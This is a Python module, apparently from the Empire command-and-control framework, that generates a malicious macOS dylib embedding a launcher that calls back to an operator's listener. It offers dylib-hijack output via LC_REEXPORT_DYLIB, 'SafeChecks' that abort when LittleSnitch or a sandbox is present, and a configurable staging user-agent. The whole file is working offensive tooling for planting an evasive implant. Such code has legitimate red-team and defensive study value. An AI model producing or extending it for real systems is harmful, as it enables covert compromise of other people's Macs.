from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'dylib',

            'Author': ['@xorrior'],

            'Description': 'Generates a dylib.',

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'python',
                'SuggestedValues': ['python'],
                'Strict': True
            },
            'Architecture': {
                'Description': 'Architecture: x86/x64',
                'Required': True,
                'Value': 'x86'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Hijacker': {
                'Description': 'Generate dylib to be used in a Dylib Hijack. This provides a dylib with the LC_REEXPORT_DYLIB load command. The path will serve as a placeholder.',
                'Required': True,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': True,
                'Value': ''
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        arch = self.options['Architecture']['Value']
        hijacker = self.options['Hijacker']['Value']
        safe_checks = self.options['SafeChecks']['Value']

        if arch == "":
            print(helpers.color("[!] Please select a valid architecture"))
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, userAgent=user_agent,
                                                           safeChecks=safe_checks)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        else:
            launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
            dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
            return dylib
